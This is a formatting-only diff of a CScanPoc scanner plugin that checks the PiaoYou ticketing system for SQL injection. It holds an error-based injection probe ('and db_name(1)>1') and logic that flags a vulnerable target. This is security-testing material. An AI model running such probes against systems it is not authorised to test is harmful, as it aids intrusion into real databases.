@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PiaoYou_0004' # 平台漏洞编号，留空
+    vuln_id = 'PiaoYou_0004'  # 平台漏洞编号，留空
     name = '票友订票系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-08-08'  # 漏洞公布时间
     desc = '''
         票友订票系统存在多处SQL注入漏洞：
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PiaoYou(票友软件)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'd2d240db-6e34-47ec-bbda-10630aab291f'
@@ -32,8 +34,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2015-0130548
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2015-0130548
             hh = hackhttp.hackhttp()
             arg = self.target
             payload1 = [
@@ -44,7 +46,7 @@ class Poc(ABPoc):
                 url = arg + payload + '%20and%20db_name%281%29%3E1'
                 code, head, res, errcode, _ = hh.http(url)
 
-                if code == 500 and 'master' in res :
+                if code == 500 and 'master' in res:
                     #security_hole(arg + payload + '  :found sql Injection')
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
@@ -54,6 +56,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
